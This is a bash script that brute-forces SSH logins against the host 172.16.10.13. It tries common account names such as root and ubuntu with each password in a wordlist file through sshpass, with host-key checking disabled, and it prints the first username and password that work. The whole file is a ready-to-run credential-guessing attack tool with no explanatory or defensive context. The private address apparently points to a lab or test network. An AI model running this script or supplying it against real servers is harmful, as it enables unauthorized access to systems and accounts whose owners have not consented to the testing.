#!/bin/bash

# Define the target SSH server and port.
TARGET="172.16.10.13"
PORT="22"

# Define the username list and password file.
USERNAMES=("root" "guest" "backup" "ubuntu" "centos")
PASSWORD_FILE="passwords.txt"

echo "Starting SSH credential testing..."

# Loop through usernames and passwords to test combinations.
for user in "${USERNAMES[@]}"; do
  while IFS= read -r pass; do
    echo "Testing: ${user} / ${pass}"

    # Attempt SSH login using sshpass.
    if sshpass -p "${pass}" ssh -o "StrictHostKeyChecking=no" \
        -p "${PORT}" "${user}@${TARGET}" exit >/dev/null 2>&1; then
      echo "Login successful!"
      echo "Host: ${TARGET}"
      echo "Username: ${user}"
      echo "Password: ${pass}"
      exit 0
    fi
  done < "${PASSWORD_FILE}"
done

echo "No valid credentials found."
exit 1
